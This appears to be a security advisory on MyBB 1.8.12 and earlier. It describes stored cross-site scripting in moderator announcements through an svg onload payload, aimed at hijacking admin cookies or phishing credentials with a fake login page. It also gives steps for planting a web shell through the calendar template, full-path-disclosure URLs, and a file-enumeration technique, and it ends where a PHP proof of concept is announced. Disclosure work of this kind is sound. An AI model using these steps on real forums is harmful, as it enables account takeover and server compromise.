MyBB (versions 1.8.12 and prior at time of writing this) is vulnerable to a cross site scripting bug which would
allow a moderator to take over an administrator&#039;s account. In addition to this, it is also possible to perform file
enumeration in the instances where it is not possible to spawn a shell. This can be used in conjunction with 
the FPD and other bugs in order to evelate the level of access and map out a potential attack surface.

-------------------------------------------------------------------------------------------------------------
Cross-Site Scripting:
-------------------------------------------------------------------------------------------------------------
A moderator or administrator can make an announcement, and can inject JavaScript into this.
MyBB however says:
> Should HTML be parsed in the announcement? (Javascript is removed)
> Source: https://docs.mybb.com/1.6/Mod-CP-Forums-Posts/#Adding.2FEditing_an_Announcement

<script> tags are stripped from the content but you can simply use generic HTML tags with event
handlers in order to trigger javascript, for example:
  <svg/onload="document.write(&#039;hi&#039;);">
When a user views the thread, the javascript will execute.
Since a moderator can post these threads, they can craft a payload that would allow them to hijack
the cookies for an admin account or create a fake login page via document.write which would hopefully
trick an admin into re-authenticating (giving up their credentials) when attempting to view the thread. 

This is a stored/persistent attack and anyone who views the thread will be hit with the payload.

There is a method that has worked for years and will work in most cases:

 - From AdminCP, Navigate to &#039;Templates and Styles&#039;
 - Determine the MyBB Theme currently in use
 - Navigate to &#039;Templates&#039;
 - Open Templates used by the current theme
 - Select &#039;calendar templates&#039; 
 - Click &#039;calendar&#039; then paste code to your shell and save
 - Navigate to http://[HOST]/calendar.php to access your shell

In the instance that you can&#039;t get a shell, then File Enumeration can still be performed as seen below:

-------------------------------------------------------------------------------------------------------------
Full Path Disclosure:
-------------------------------------------------------------------------------------------------------------
Almost all the parameters are vulnerable to this, but this is an example of one:
  http://[HOST]/mybb/admin/index.php?module[]

In older versions of MyBB, It&#039;s possible to get FPD (and also some PHP configuration info outputted) without
requiring ACP access, this can be done via insertion of an array into the &#039;sid&#039; get parameter.
Example:

http://[HOST]/search.php?action=results&sid[]=YourSessionID&sortby=&order=desc

-------------------------------------------------------------------------------------------------------------
File Enumeration:
-------------------------------------------------------------------------------------------------------------
File enumeration can be performed, allowing an attacker to search for the existence of vulnerable plugins, locate
paths to config files, etc.

We&#039;ll enumerate files by changing the theme file to a file we want. If the file exists, it will not give an error.
If the file does not exists, it&#039;ll throw an error.

A working Proof-of-Concept (written in PHP) is given here:
